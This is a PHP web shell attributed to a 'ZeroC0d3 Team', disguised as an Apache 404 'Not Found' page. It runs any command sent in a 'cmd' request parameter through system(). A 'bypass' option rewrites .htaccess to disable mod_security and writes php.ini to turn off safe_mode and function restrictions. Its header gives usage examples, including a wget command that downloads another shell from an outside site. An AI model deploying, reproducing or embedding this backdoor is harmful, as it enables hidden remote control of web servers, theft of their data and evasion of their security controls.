<?php
/**
Simple Shell 404 with bypass php.ini and .htaccess
--------------------------------------------------------
__________                  _________ _______       .___________  
\____    /___________  ____ \_   ___ \\   _  \    __| _/\_____  \ Team
  /     // __ \_  __ \/  _ \/    \  \//  /_\  \  / __ |   _(__  <
 /     /\  ___/|  | \(  <_> )     \___\  \_/   \/ /_/ |  /       \
/_______ \___  >__|   \____/ \______  /\_____  /\____ | /______  /
        \/   \/                     \/       \/      \/        \/
 
ZeroC0d3 Team
[ N0th1ng Imp0ss1bl3, Grey Hat Coder ]
--------------------------------------------------------
http://pastebin.com/u/zeroc0d3

POC :
---------------------
>>> Simple command :
yoursite.com/404.php?cmd=wget -O zeroc0d3.php http://yourothersitewithshell/yourshell.txt
yoursite.com/404.php?cmd=ls -alR

>>> Simple bypass :
yoursite.com/404.php?bypass

**/

function head() {
    function perlex() {
        if (extension_loaded('perl')) {
            echo('<strong>PERL</strong> - <i><u>Extension Loaded</u></i>');
        } else {
            echo('<strong>PERL</strong> - <i><u>Extension Not Loaded</u></i>');
        }
    }

    function pythonex() {
        if (extension_loaded('python')) {
            echo("<strong>PYTHON</strong> - <i><u>Extension Loaded</u></i>");
        } else {
            echo("<strong>PYTHON</strong> - <i><u>Extension Not Loaded</u></i>");
        }
    }

    if (isset($_REQUEST['cmd'])) {
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die ;
    }
    if (isset($_REQUEST['bypass'])) {
        echo perlex();
        echo "<br>";
        echo pythonex();
        $modsecby = @fopen(".htaccess", "w");
        fwrite($modsecby, '<IfModule mod_security.c>
    Sec------Engine Off
    Sec------ScanPOST Off
</IfModule>');
        fclose($modsecby);
        $phpinisecby1 = @fopen("php.ini", "w");
        fwrite($phpinisecby1, 'safe_mode=OFF
disable_functions=NONE');
        fclose($phpinisecby1);
        echo ".htaccess = bypass complete.<br>php.ini = bypass complete.";
    }
}
?>
<html>
<body>
    <?php head(); ?>
    <h1>Not Found</h1> 
    <p>The requested URL was not found on this server.</p> 
    <hr> 
    <address>Apache Server at localhost Port 80</address> 
    <style> 
         input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
</body>
</html>
